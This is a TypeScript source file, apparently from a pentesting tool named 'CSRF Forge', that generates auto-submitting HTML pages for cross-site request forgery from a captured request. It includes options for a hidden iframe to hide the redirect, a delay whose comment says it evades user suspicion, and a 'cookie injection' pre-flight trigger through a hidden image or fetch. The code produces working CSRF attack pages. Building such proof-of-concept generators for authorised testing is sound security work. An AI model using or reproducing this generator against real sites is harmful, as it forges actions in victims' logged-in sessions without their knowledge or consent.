import { ParsedRequest } from '../../types';
import { PocGeneratorOptions, escapeHtml, escapeJsString, extractPreflightUrl } from './types';
import { parseUrlEncodedBody } from '../parser/httpParser';

/**
 * Generates an auto-submitting HTML form PoC.
 */
export function generateHtmlFormPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  const autoSubmit = options.autoSubmit !== false;
  const stealthIframe = options.stealthIframe === true;
  const delayMs = options.delayMs || 0;
  const buttonText = options.buttonText || 'Submit Request';
  const includeComments = options.comments !== false;

  // Determine parameters to include
  const bodyParams = options.customParameters || parseUrlEncodedBody(request.body);
  const targetUrl = request.url;
  const method = request.method.toUpperCase();

  const iframeName = 'csrf_forge_stealth_frame';
  const formId = 'csrf_form';

  const preflight =
    options.preflight?.enabled && options.preflight.url?.trim()
      ? {
          url: extractPreflightUrl(options.preflight.url),
          mode: options.preflight.triggerMode || 'onerror',
        }
      : null;

  const submitStatement =
    delayMs > 0
      ? `setTimeout(function() { document.getElementById('${formId}').submit(); }, ${delayMs});`
      : `document.getElementById('${formId}').submit();`;

  const inputsHtml = Object.entries(bodyParams)
    .map(
      ([key, val]) =>
        `      <input type="hidden" name="${escapeHtml(key)}" value="${escapeHtml(val)}" />`
    )
    .join('\n');

  let preflightHtml = '';
  let scriptHtml = '';

  if (preflight) {
    if (preflight.mode === 'fetch') {
      preflightHtml = `\n    <!-- Pre-flight trigger via Fetch API -->\n    <script>
      fetch(${escapeJsString(preflight.url)}, { mode: 'no-cors' })
        .finally(function() {
          ${autoSubmit ? submitStatement : '// Pre-flight executed; waiting for manual submission'}
        });
    </script>\n`;
    } else {
      const eventAttr = preflight.mode === 'onload' ? 'onload' : 'onerror';
      const handler = autoSubmit ? ` ${eventAttr}="${submitStatement}"` : '';
      preflightHtml = `\n    <!-- Pre-flight trigger / Cookie injection payload (${preflight.mode}) -->\n    <img src="${escapeHtml(
        preflight.url
      )}"${handler} style="display:none;" />\n`;
    }
  } else if (autoSubmit) {
    if (delayMs > 0) {
      scriptHtml = `
    <script>
      // Delay auto-submit to evade initial user suspicion
      setTimeout(function() {
        document.getElementById('${formId}').submit();
      }, ${delayMs});
    </script>`;
    } else {
      scriptHtml = `
    <script>
      // Auto-submit on DOM payload execution
      document.getElementById('${formId}').submit();
    </script>`;
    }
  }

  const iframeHtml = stealthIframe
    ? `\n    <!-- Hidden stealth iframe to swallow redirect & prevent top-frame navigation -->\n    <iframe name="${iframeName}" style="display:none;width:0;height:0;border:0;"></iframe>\n`
    : '';

  const commentsHeader = includeComments
    ? `  <!--
    CSRF Forge Proof of Concept
    Target URL: ${escapeHtml(targetUrl)}
    Method: ${method}
    Vector: HTML Form Submission${preflight ? ` with Pre-flight Cookie Injection (${preflight.mode})` : ''}
    ${preflight ? `Pre-flight URL: ${escapeHtml(preflight.url)}\n    ` : ''}Generated: ${new Date().toISOString()}
  -->\n`
    : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Verification PoC</title>
</head>
<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
${commentsHeader}${iframeHtml}${preflightHtml}    <form id="${formId}" action="${escapeHtml(targetUrl)}" method="${method}"${
    stealthIframe ? ` target="${iframeName}"` : ''
  }>
${inputsHtml}
      <noscript>
        <p>JavaScript is disabled. Click below to continue:</p>
        <button type="submit">${escapeHtml(buttonText)}</button>
      </noscript>
      ${
        !autoSubmit
          ? `<button type="submit" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">${escapeHtml(
              buttonText
            )}</button>`
          : ''
      }
    </form>${scriptHtml}
</body>
</html>`;
}
